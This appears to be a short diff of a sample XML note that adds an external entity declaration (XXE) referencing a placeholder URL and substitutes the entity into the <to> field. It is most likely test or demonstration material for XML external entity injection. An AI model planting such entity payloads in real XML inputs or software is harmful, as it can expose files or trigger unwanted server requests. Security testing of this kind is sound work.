@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [  
-<!ELEMENT foo (#ANY)>
+<!DOCTYPE to [  
+<!ELEMENT to (#ANY)>
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]>
 <note>
-  <to>Tove</to>
+  <to>&xxe;</to>
   <from>Jani</from>
   <heading>Reminder</heading>
   <body>Don't forget me this weekend!</body>
